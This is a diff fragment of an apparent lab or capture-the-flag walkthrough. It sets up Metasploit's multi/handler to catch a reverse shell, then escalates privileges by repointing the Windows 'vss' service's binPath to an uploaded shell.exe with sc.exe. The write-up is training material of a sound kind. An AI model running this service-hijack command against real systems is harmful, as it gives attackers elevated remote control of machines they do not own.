@@ -52,3 +52,15 @@ Now will configure the Msfconsle before running the shell.exe
 ```
 use exploit/multi/handler 
 ```
+![[Pasted image 20240506040642.png]]
+
+Now we can run it and catch the shell
+
+Now let's change the path of service binary
+```
+sc.exe config vss binPath="C:\Users\svc-printer\Documents\shell.exe"
+```
+![[Pasted image 20240506040930.png]]
+As we started the sc.exe it got stuck which is an indication that we might got a shell finally
+![[Pasted image 20240506041014.png]]
+
